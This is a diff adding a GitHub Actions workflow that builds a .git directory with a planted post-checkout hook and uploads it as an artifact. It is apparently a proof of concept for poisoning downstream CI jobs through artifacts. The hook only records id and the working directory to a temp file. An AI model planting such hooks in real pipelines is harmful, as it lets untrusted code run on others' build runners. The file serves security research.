@@ -1,0 +1,31 @@
+---
+name: Producer
+on:
+  workflow_dispatch:
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build a plantable .git directory
+        run: |
+          mkdir -p plant
+          cd plant
+          git init -q .
+          git -c user.email=a@b -c user.name=x commit -q --allow-empty -m planted
+          git remote add origin https://github.com/PDFtoMark/gab-poc-gitplant
+          cat > .git/hooks/post-checkout <<'HOOK'
+          #!/bin/sh
+          echo HOOK-RAN > /tmp/hook.txt
+          id >> /tmp/hook.txt
+          echo "PWD=$(pwd)" >> /tmp/hook.txt
+          HOOK
+          chmod +x .git/hooks/post-checkout
+          mkdir -p .git/hooks
+          ls -la .git/hooks/post-checkout
+          cat .git/config
+      - uses: actions/upload-artifact@v4
+        with:
+          name: plant
+          path: plant
+          include-hidden-files: true
